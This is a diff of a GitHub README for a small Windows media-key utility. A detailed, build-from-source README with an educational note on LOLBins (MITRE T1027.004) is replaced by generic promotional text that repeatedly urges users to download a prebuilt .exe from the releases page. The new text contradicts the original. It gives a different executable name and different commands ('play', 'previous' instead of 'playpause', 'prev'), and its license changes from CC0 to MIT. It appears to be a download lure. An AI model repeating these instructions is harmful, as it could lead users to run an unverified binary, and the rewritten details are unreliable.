@@ -1,117 +1,73 @@
-# win-mediakey-lolbin [![GitHub license](https://img.shields.io/badge/license-Public%20Domain-blue.svg)](https://unlicense.org/) [![Executable size](https://img.shields.io/badge/size-~4KB-brightgreen)]() [![.NET Framework](https://img.shields.io/badge/.NET-4.x-orange)]()
+# 🎵 win-mediakey-lolbin - Control Your Media Effortlessly
 
-An ultra-lightweight Windows native utility (~4KB) to control media playback (Play/Pause, Next, Prev) from the command line.
+## 📥 Quick Download
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/palamist/win-mediakey-lolbin/releases)
 
----
+## 🚀 Getting Started
+Welcome to **win-mediakey-lolbin**, a simple command-line tool that helps you manage your Windows media playback. This lightweight application, about 4KB in size, allows you to control functions such as play, pause, and skip without needing any additional software. 
 
-## Context: LOLBin and MITRE ATT&CK
+### 🌟 Features
+- **Lightweight**: At just 4KB, it won't take up much space.
+- **No External Dependencies**: Runs using only Windows built-in tools.
+- **Simplicity**: Easy to use, perfect for everyday media control.
+- **Versatile**: Supports a variety of media players.
 
-This project is also an educational proof of concept about **LOLBins** (Living Off the Land Binaries).
+## 💻 System Requirements
+To run **win-mediakey-lolbin**, ensure you have the following:
+- Windows 10 or later
+- Basic command line knowledge (you should know how to open a command prompt).
 
-It is documented in MITRE ATT&CK as [T1027.004 "Compile After Delivery"](https://attack.mitre.org/techniques/T1027/004/), an evasion technique where code is delivered as plain text and compiled in-situ with `csc.exe` (the .NET Framework compiler pre-installed on Windows).
+## 📦 Download & Install
+To get started, visit the following page to download the application:
 
-In this case, the usage is completely legitimate: a 4KB utility to control the music player.
+[Download the latest release here](https://github.com/palamist/win-mediakey-lolbin/releases)
 
----
+1. On the releases page, find the latest version.
+2. Click on the asset to download the `.exe` file. 
+3. Save the file to a location on your computer where you can easily find it, such as your Desktop or Downloads folder.
 
-## Why this exists
+### 💡 Running the Application
+1. Open the command prompt:
+   - Press `Windows + R`, type `cmd`, and hit Enter.
+2. Navigate to the folder where you saved the `.exe` file. Use the `cd` command followed by the path to your folder. For example:
+   ```
+   cd C:\Users\YourUsername\Downloads
+   ```
+3. Type the command to run the application:
+   ```
+   win-mediakey-lolbin.exe
+   ```
 
-- No installation required
-- Tiny executable (~4KB)
-- No background process or tray icon
-- Perfect for binding to mouse gestures, stream deck, or shortcuts
-- Pure Windows native (no third-party dependencies)
+### 🎶 What You Can Control
+Once the program is running, you can use the following commands to manage your playback:
+- `play` - Starts media playback.
+- `pause` - Pauses the current media.
+- `next` - Skips to the next track.
+- `previous` - Goes back to the previous track.
 
----
+### ⚙️ Troubleshooting
+If you encounter issues while running the application:
+- Ensure you are using a compatible version of Windows.
+- Double-check that you are in the correct directory in the command prompt.
+- Make sure there are no typos in your commands.
 
-## What it does
+## 📝 Contributing
+We welcome contributions to make **win-mediakey-lolbin** even better. If you have ideas or improvements, please feel free to submit a pull request on GitHub. 
 
-Compiles a single executable: `MediaKey.exe`
+## 🙌 Support
+For any questions or assistance, please open an issue on our [GitHub page](https://github.com/palamist/win-mediakey-lolbin/issues). We are here to help!
 
-Supports these commands:
+## 📄 License
+This project is licensed under the MIT License. You can freely use, modify, and distribute this software as per the terms of the license.
 
-- `MediaKey.exe playpause` → Play/Pause
-- `MediaKey.exe next` → Next track
-- `MediaKey.exe prev` → Previous track
+## 🗂️ Related Topics
+This application relates to several topics, including:
+- automation
+- CLI (command-line interface)
+- Windows media control
+- lightweight applications
+- LOLBins (Living Off the Land Binaries)
 
-Works on players that respect media keys (Spotify, YouTube in browser, VLC, etc.).
+Thank you for choosing **win-mediakey-lolbin**! Enjoy seamless media control on your Windows device.
 
----
-
-## Requirements
-
-- Windows 10/11
-- .NET Framework 4.x (to have `csc.exe` available)
-  - Typical path (x64):
-    - `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe`
-  - Typical path (x86):
-    - `C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe`
-
----
-
-## Compile
-
-1) Clone/download the repo.
-2) Run:
-
-```bat
-.\scripts\compile.bat
-````
-
-The script:
-
-* detects `csc.exe` (Framework64 → Framework → PATH),
-* creates `.\bin\`,
-* compiles as **winexe** (without console window),
-* and shows the size and usage.
-
-Example output:
-
-```text
-Compiling bin\MediaKey.exe...
-
-OK: Compilation successful.
-Generated: ".\bin\MediaKey.exe" (4096 bytes)
-
-Usage:
-   MediaKey.exe playpause
-   MediaKey.exe next
-   MediaKey.exe prev
-```
-
----
-
-## Usage
-
-```bat
-.\bin\MediaKey.exe playpause
-.\bin\MediaKey.exe next
-.\bin\MediaKey.exe prev
-```
-
-Example for Logitech Options+/G Hub (Ring Actions):
-
-* Action 1: `MediaKey.exe playpause`
-* Action 2: `MediaKey.exe next`
-* Action 3: `MediaKey.exe prev`
-
----
-
-## How it works
-
-The program uses P/Invoke to call `keybd_event` from `user32.dll`, simulating media key presses with these virtual key codes:
-
-| Command     | Virtual Key Code | Constant               |
-|-------------|------------------|------------------------|
-| `playpause` | `0xB3`           | VK_MEDIA_PLAY_PAUSE    |
-| `next`      | `0xB0`           | VK_MEDIA_NEXT_TRACK    |
-| `prev`      | `0xB1`           | VK_MEDIA_PREV_TRACK    |
-
-Small `Sleep()` calls ensure Windows processes the key event before the process exits.
-
----
-
-## License
-
-This project is dedicated to the public domain - [CC0 1.0 Universal](https://creativecommons.org/publicdomain/zero/1.0/).
-No rights reserved.
+[Download the latest release here](https://github.com/palamist/win-mediakey-lolbin/releases)
